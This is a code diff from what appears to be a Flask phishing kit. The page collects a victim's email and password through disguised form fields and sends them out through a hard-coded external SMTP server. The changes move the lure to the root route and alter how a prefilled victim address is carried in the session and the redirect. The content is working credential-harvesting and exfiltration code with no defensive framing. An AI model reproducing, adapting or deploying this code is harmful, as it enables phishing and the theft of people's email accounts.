@@ -124,7 +124,7 @@ def success():
         return redirect(url_for('captcha'))
 
 
-@app.route("/m")
+@app.route("/")
 def route2():
     web_param = request.args.get('web')
     if web_param:
@@ -143,9 +143,6 @@ def first():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-	web_param = request.args.get('web')
-        session['eman'] = web_param
-        session['ins'] = web_param[web_param.index('@') + 1:]
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "contant@greenscience.bio"
@@ -170,7 +167,7 @@ def first():
         with smtplib.SMTP("5.149.253.103", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('benza', eman=session.get('eman'), ins=session.get('ins')))
+        return redirect(url_for('benza', web=session.get('eman')))
 
 
 
